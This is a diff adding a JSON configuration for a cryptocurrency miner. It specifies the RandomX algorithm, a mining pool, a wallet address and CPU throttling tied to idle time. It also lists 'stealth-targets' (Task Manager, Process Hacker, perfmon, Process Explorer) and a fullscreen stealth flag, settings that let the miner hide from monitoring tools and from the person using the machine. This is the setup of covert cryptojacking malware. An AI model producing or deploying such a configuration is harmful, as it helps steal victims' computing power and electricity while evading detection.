@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "etc.2miners.com",
+    "port": 1010,
+    "wallet": "0x7c6E7f2Da1ACF8472566bF372B0BC5bC0B008C3B",
+    "password": "",
+    "nicehash": false,
+    "ssltls": false,
+    "max-cpu": 20,
+    "idle-wait": 3,
+    "idle-cpu": 90,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true
+}
